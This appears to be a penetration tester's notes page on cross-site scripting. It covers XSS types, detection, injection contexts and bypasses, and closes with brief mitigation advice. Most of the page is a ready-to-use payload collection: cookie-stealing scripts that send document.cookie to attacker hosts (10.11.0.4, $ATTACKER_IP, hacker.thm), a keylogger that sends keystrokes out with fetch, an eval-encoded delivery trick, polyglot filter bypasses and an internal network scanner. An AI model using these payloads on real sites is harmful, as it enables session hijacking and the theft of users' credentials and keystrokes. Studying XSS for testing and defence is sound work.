# XSS

| [https://xsshunter.com/](https://xsshunter.com/)                                                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) |
| [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)                         |

Cross-site scripting allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.

XSS allows attackers to inject malicious scripts (usually JavaScript) into web pages viewed by other users. These scripts can steal cookies, session tokens, or perform actions on behalf of the user without their consent, i.e. exploit a trusted website with malicious scripts reflected (we can modify a parameter reflected in the response).

{% hint style="danger" %}
VERY IMPORTANT: Test all available inputs (input fields, URL, parameters...).&#x20;

See if we can type sth that gets reflected on the response (seen on the website).&#x20;

Then submit different chars to see which are reflected or encoded.&#x20;

If we edit the response as HTML (Dev Tools > Inspect > Edit as HTML) to see if the response was HTML encoded.

If there is any limitation (client-side checks) either use Dev Tools > Inspect or Burp to bypass them.
{% endhint %}

## Types of XSS

* Reflected XSS, where the malicious script comes from the current HTTP request and embeds the script within the immediate HTTP response.
* Stored XSS, where the malicious script comes from the website's database (stores the input and embeds it into a later response).
* DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
* Self-XSS, only triggered if the victim themselves submits the XSS payload from their browser. Delivering normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.

## Identification / Basic payloads

{% code overflow="wrap" fullWidth="true" %}
```html
# IDENTIFY INPUT FIELDS (SUCH AS SEARCH FIELDS)
< > ' " { } ;
If the application does not remove or encode these characters in the response, it maybe vulnerable to XSS as the characters can be used to introduce codeinto the page.

# INSPECT ELEMENT, CHECK INSIDE THE MESSAGE AND IF THE OUTPUT IS FILTERED

# Content Injection
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>

# HTML Injection
<h1>
<marquee>

# XSS in case someone checks or loads a website
<script src="http://10.10.10.10/pwned.js"></script>
#Second option
<img src="http://10.10.10.10/test"></img><a href="http://10.10.10.10/">click me</a>

# AN XSS PAYLOAD TO STEAL COOKIES
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
We set up nc -lvnp 80 and when the user logs in, we get the cookie

script/xss
TRY '<>:;"
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
"><h1>test</h1>
'+alert(1)+'
"onmouseover="alert(1)
http://"onmouseover="alert(1)

<h1></h1>  #try to insert HTML at first
window.location.hostname # know hostname or IPml
# DEFACE A WEBSITE
If there is an element > Inspect element > <span id="thm-title">
# TO CHANGE THE TITLE WITH CONSOLE
document.querySelector('#thm-title').textContent = "Hey"
```
{% endcode %}

## Reflected cross-site scripting

{% code overflow="wrap" fullWidth="true" %}
```sh
Only affects the person submitting the request, requires social engineering trick, most common XSS attack.
# Detection: 
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
# Impact: perform any action that the user can perform
# How to find and test for reflected XSS vulnerabilities
Test every entry point
Submit random alphanumeric values (lenght of 8 is ideal) for every entry point and see if it gets reflected
Determine the reflection context. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc. 
# XSS between HTML tags
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
# TO BE CONTINUED...
```
{% endcode %}

![](https://i.imgur.com/yX7zRh8.png)

## Stored cross-site scripting

{% code overflow="wrap" fullWidth="true" %}
```sh
Stored XSS attack gets cached on the server and affect all site users (comment sections, product reviews, or wherever user content can be stored and reviewed later).
# Detection:
- Comments on a blog
- User profile information
- Website Listings

# The data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. 
<p>Hello, this is my message!</p>
<p><script>/* Bad stuff here... */</script></p>
```
{% endcode %}

![](https://i.imgur.com/LCSFUTB.png)

## DOM-Based XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.

{% code overflow="wrap" fullWidth="true" %}
```sh
https://www.w3.org/TR/REC-DOM-Level-1/introduction.html

# Example: app uses some JavaScript to read the value from an input field and write that value to an element within the HTML:
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
#  If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute: 
You searched for: <img src=1 onerror='/* Bad stuff here... */'>

# HOW TO TEST
# Testing HTML sinks
Place a random alphanumeric string into the source (such as location.search) and then use developer tools
to inspect the HTML and find where your string appears. In Chrome developer tools, Control+F to search the DOM for your string. 
# Testing JavaScript execution sinks
Little harder. Input does not appear on DOM so we need Javascript debugger to determine whether and how your input is sent to a sink. 
In Chrome Developer Tools, Control+Shift+F (or Command+Alt+F on MacOS) to search all the page JavaScript code for the source.  
Once you found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source value is used.

# Exploiting DOM XSS with different sources and sinks
document.write('... <script>alert(document.domain)</script> ...'); # document.write sink works with script elements
"><script>alert(document.domain)</script>
"
# innerHTML sink doesn't accept script elements on any modern browser, you will use elements like img or iframe 
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...' 
# Sources and sinks in third-party dependencies
# DOM XSS in jQuery
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
?returnUrl=javascript:alert(document.domain)
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
# DOM XSS in AngularJS
If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events.
AngularJS might execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes. 

# DOM XSS combined with reflected and stored data
eval('var data = "reflected string"');
element.innerHTML = comment.author

# Which sinks can lead to DOM-XSS vulnerabilities?
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
#  The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities: 
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

# How to prevent DOM-based taint-flow vulnerabilities
There is no single action you can take to eliminate the threat of DOM-based attacks entirely. 
However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is 
to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink. 
```
{% endcode %}

## Cross-site scripting contexts

```
# XSS between HTML tags
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

# XSS in HTML tag attributes
"><script>alert(document.domain)</script>
# your input cannot break out of the tag -> terminate the attribute value and introduce new attribute
" autofocus onfocus=alert(document.domain) x="
"
<a href="javascript:alert(document.domain)">
# Canonical tag -> you can exploit this behavior using access keys and user interaction on Chrome

# XSS into JavaScript
# Terminating the existing script
<script>
...
var input = 'controllable data here';
...
</script>
</script><img src=1 onerror=alert(document.domain)>
# Breaking out of a JavaScript string (literal, quotes)
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)// # in case ' is blacklisted with backslash
onerror=alert;throw 1 # call functions w/o parentheses
# Making use of HTML-encoding
<a href="#" onclick="... var input='controllable data here'; ...">
&apos;-alert(document.domain)-&apos; # &apos; sequence is an HTML entity representing an apostrophe or single quote
# XSS in JavaScript template literals
# Template literals are encapsulated in backticks, and embedded expressions are identified using the ${...} syntax. 
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
<script>
...
var input = `controllable data here`;
...
</script>
${alert(document.domain)}
```

## Blind XSS

Similar to Stored XSS but we can't see the payload working against ourselves first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

[https://github.com/mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)

this tool will automatically capture cookies, URLs, page contents and more.

## Steal content / Cookie Hijacking (Privilege escalation)

We could leverage our XSS to steal cookies and session information if the application uses an insecure session management configuration (only for session cookies, not all cookies).

The **Secure flag** instructs the browser to only send the cookie over encrypted connections, such as HTTPS.

The **HttpOnly flag** instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

{% code overflow="wrap" fullWidth="true" %}
```javascript
https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/

# When we craft our HTTP request in JS code, we inify our attack code into a one-liner
https://jscompres.com
# Then we encode it so no badchars will interfere on the payload
function encode_to_javascript(string) {
	var input = string 
	var output = ''; 
	for(pos = 0; pos < input.length; pos++) { 
		output += input.charCodeAt(pos); 
		if(pos != (input.length - 1)) { 
			output += ","; 
		} 
	} 
	return output; 
} 
let encoded = encode_to_javascript('insert_minified_javascript') console.log(encoded)
# Let’s run the function from the browser’s console.
# To deliver the payload, we have to decode it and execute it with eval
"<script>eval(String.fromCharCode(118,97,...))</script>"
First we check it with curl --proxy to see it on Burp and then if it is ok we forward to the target.

# Some closing tags " ' > might be need for the payload to work
"><script>alert('0')</script>
';alert('2');//
<sscriptcript>alert('2');</sscriptcript>
" onload="alert('2');
# Polyglots
jaVasCript:/*-/*`/*\`/*'/*"/**/(/*  */onerror=alert('2')  )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


# Steal content / cookies from restricted pages or files
https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files
<script>document.write('<img src="http://$ATTACKER_IP/image.jpg?cookie=' + document.cookie + '">')</script>
//We also need to deploy a server with Python to catch the cookie
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
<img src=1 onerror=this.src="http://10.10.14.183/?ccc="+encodeURIComponent(document.cookie)>

# Key Logger
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

# Business Logic (in case it is available a JS function like this)
<script>user.changeEmail('attacker@hacker.thm');</script>
```
{% endcode %}

## What can XSS be used for?

An attacker who exploits a cross-site scripting vulnerability is typically able to:

* Impersonate or masquerade as the victim user.
* Carry out any action that the user is able to perform.
* Read any data that the user is able to access.
* Capture the user's login credentials.
* Perform virtual defacement of the web site.
* Inject trojan functionality into the web site.

## Content security policy (CSP)

Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities. If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability. Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability.

## Dangling markup injection

Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses. It can often be exploited to capture sensitive information that is visible to other users, including CSRF tokens that can be used to perform unauthorized actions on behalf of the user.

## Deliver exploit to a victim

```javascript
<script>
location="https://xxxx"
</script>
```

## IP and Port Scanning with XSS

{% code overflow="wrap" fullWidth="true" %}
```javascript
# For example, a website could try to find if your router has a web interface at 192.168.0.1 by:
<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">

# The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255
   <script>
  for (let i = 0; i < 256; i++) {// This is looping from 0 to 255
   let ip = '192.168.0.' + i// Creates variable for forming IP
  // Creating an image element, if the resource can load, it logs to the /logs page.
   let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
   document.body.innerHTML += code// This is adding the image element to the webpage
  }
</script>

# A more detailed port scanner
https://github.com/aabeling/portscan
```
{% endcode %}

## Key-Logger with XSS

{% code overflow="wrap" fullWidth="true" %}
```html
# Javascript can be used for many things, including creating an event to listen for keypresses.
 <script type="text/javascript">
  let l = ""; // Variable to store key-strokes in
  document.onkeypress = function (e) { // Event to listen for key presses
    l += e.key; // If user types, log it to the l variable
    console.log(l); // update this line to post to your own server
  }
 </script>
```
{% endcode %}

## Filter Evasion / Filter Bypass

<pre class="language-sh" data-overflow="wrap" data-full-width="true"><code class="lang-sh">https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/

<strong># Real-world scenarios (Bug Bounties)
</strong>https://hackerone.com/reports/415484
https://hackerone.com/reports/409850
https://hackerone.com/reports/449351
https://hackerone.com/reports/283825
</code></pre>

## Other Exploits

**BeEF** is a penetration testing tool that focuses on the web browser. The concept here is that you "hook" a browser (using XSS), then you are able to launch and control a range of different attacks.

BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.

## Mitigation

**Filter input on arrival.**

**Encode data on output.**

**Use appropriate response headers.**

**Content Security Policy.**

**HTTPOnly & Secure Cookies:** Set cookies with HttpOnly and Secure flags to protect them from being accessed via JavaScript.

**What is the difference between XSS and CSRF?** XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.

**What is the difference between XSS and SQL injection?** XSS is a client-side vulnerability that targets other application users, while SQL injection is a server-side vulnerability that targets the application's database.

**How do I prevent XSS in PHP?** Filter your inputs with a whitelist of allowed characters and use type hints or type casting. Escape your outputs with `htmlentities` and `ENT_QUOTES` for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.

**How do I prevent XSS in Java?** Filter your inputs with a whitelist of allowed characters and use a library such as Google Guava to HTML-encode your output for HTML contexts, or use JavaScript Unicode escapes for JavaScript contexts.
